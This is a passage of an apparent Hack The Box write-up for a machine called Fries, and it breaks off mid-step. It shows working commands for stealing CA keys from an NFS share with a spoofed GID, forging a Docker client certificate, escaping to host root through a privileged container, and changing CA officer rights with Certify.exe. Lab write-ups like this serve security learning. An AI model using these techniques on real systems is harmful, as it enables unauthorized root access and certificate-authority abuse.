We can follow the wiki

NetExec: Escape to root file system

We can’t overwrite the etc/passwd and etc/shadow files, so we can’t get on the system this way. In the actual share (which is in /srv/web.fries.htb) there are a few interesting certificate keys and such. However we can’t get them using NetExec, so we’ll have to mount the share:

sudo mkdir /tmp/friesmnt
sudo mount -t nfs -o ro,soft,timeo=10 172.18.0.1:/srv/web.fries.htb/certs /mnt/friesmnt
# We can also mount the whole share, but I figured we'd just use the certs since we don't
# need the rest

If we ls -la we the friesmnt we see that the only GID allowed is 59605603. So we create a user with that GID:

sudo useradd bananaman
vim /etc/passwd

change the /etc/passwd entry for bananaman:

bananaman:x:1001:59605603::/home/bananaman:/bin/sh

and now we can access the mount. Let’s move the mount files somewhere we can read them without needing to interact with the mount:

sudo -u bananaman cp -r ./friesmnt/ /tmp/testdir 
sudo chown kali /tmp/testdir 
sudo chown kali /tmp/testdir/*
sudo umount /mnt/friesmnt

and now all of our files are in /tmp/testdir and our user (kali) has perms over them. After that you can also move them to wherever you want.

SSH as svc​

If we run netstat -tulnp we can see that port 2376 (Docker API) is open.

tcp        0      0 127.0.0.1:2376          0.0.0.0:*               LISTEN      -

Since we have the CA private keys, we can make our own certificate that the docker will accept.

First, let’s create our configuration file which we’ll use to craft the certificate. Create a file called root.cnf with this content:

[ req ]
distinguished_name = req_distinguished_name
prompt = no

[ req_distinguished_name ]
CN = root

root in this case is the username that docker is going to see. Now let’s generate a new private key:

openssl genrsa -out key.pem 2048

Then we create the certificate signing request:

openssl req -new -key key.pem -out root.csr -config root.cnf

And finally, sign the key with the CA private key we found:

openssl x509 -req -in root.csr \
  -CA ca.pem -CAkey ca-key.pem -CAcreateserial \
  -out cert.pem -days 365 -sha256
┌──(kali㉿kali)-[~/…/HTB/Machines/Hard/Fries]
└─$ openssl x509 -req -in root.csr \                                                                  
  -CA certs/ca.pem -CAkey certs/ca-key.pem -CAcreateserial \
  -out cert.pem -days 365 -sha256      

Certificate request self-signature ok
subject=CN=root

Perfect! Now we just need to connect to the docker daemon with our new forged certificate.

docker context create fries \
--docker host=tcp://240.0.0.1:2376 \
--docker ca=certs/ca.pem \
--docker cert=cert.pem \
--docker key=key.pem \
--docker skip-tls-verify=true

This will create a context called fries. A Docker context is like a connection profile that tells the Docker CLI how to connect to a Docker daemon. In this case, we create this connection profile with information on where to connect, what certificates to use and connection options (the tls one). We can select our context with docker context use fries .

Now. To connect as root and get the user flag:

docker run -it --rm --privileged --net=host --pid=host -v /:/mnt [image] \
bash -c "chroot /mnt /bin/bash || chroot /mnt /bin/sh"

Note: replace image with the docker image you get by running docker images and copying the image ID of fries

What does this command do exactly?

Run docker interactively (-i) and with a TTY/terminal (-t), and mount the whole target on your /mnt, and then spawn a bash as root (because of the docker context) with the filesystem’s root being /mnt/.

And boom! We get the user flag! I saved id_rsa in the folder in case you need to log in with ssh.

The most important fields are the ones marked in bold. ****

  1. Subject: Subject: CN=DC01.fries.htb

This is the identity of the server. Since it is a hostname, this is a TLS certificate.

  1. Certificate issuer: Issuer: CN=fries-DC01-CA, DC=fries, DC=htb

This is the actual Certificate Authority (CA) that issued the certificate (fries-DC01-CA)

  1. ExtendedKeyUsages (EKU):
ExtendedKeyUsages [
  clientAuth
  serverAuth
]

This defines what the certificate is allowed to do.

  • serverAuth → TLS server for LDAPS / HTTPS / etc.
  • clientAuth → Can be used to authenticate as a client (Kerberos/LDAP mutual auth scenarios).

The clientAuth here is used because PWM is authenticating as infra_svc which is a client.

  1. KeyUsage:
KeyUsage [
  DigitalSignature
  Key_Encipherment
]
  • DigitalSignature → used in TLS handshake
  • Key_Encipherment → used for RSA key exchange or session key wrapping

A certificate that allowed one to act as a CA would include properties such as keyCertSign and cRLSign.

  1. IsRootCA: False

This means that this certificate does not act as a certificate authority, and therefore cannot issue other certificates. This means that this is a leaf certificate.

💡

A leaf certificate (also called an end-entity certificate) is the final certificate in the chain of trust, aka the one actually used by the server/client/user/device. The certificate chain goes like this

Root CA → Intermediate CA (optional) → Leaf certificate

Basically, it can only be used by a specific server or user to prove its identity. While this is the certificate of the DC01 machine account (as we can see from the subject), it is not enough for us to log in to anything as DC01, since we would also need the CA Private Key.

In conclusion, this certificate is a simple TLS public certificate and cannot be used (alone) to gain access to anything.

I am not sure how one would decrypt the key, although it is probably possible.

As we can see in the CA Permissions, while our user FRIES\gMSA_CA_prod$ has ManageCertificates and ManageCA privileges, the group it is in Domain Computers has ManageCertificates marked as Deny. So we need to add Domain Computers as officer as well:

.\Certify.exe manage-ca --ca "DC01.fries.htb\fries-DC01-CA" \
--officer S-1-5-21-858338346-3861030516-3975240472-515

And now if we run the same command as above, we see that the Deny entry is no longer there and we can finish our exploitation. Let’s try approving the request again:
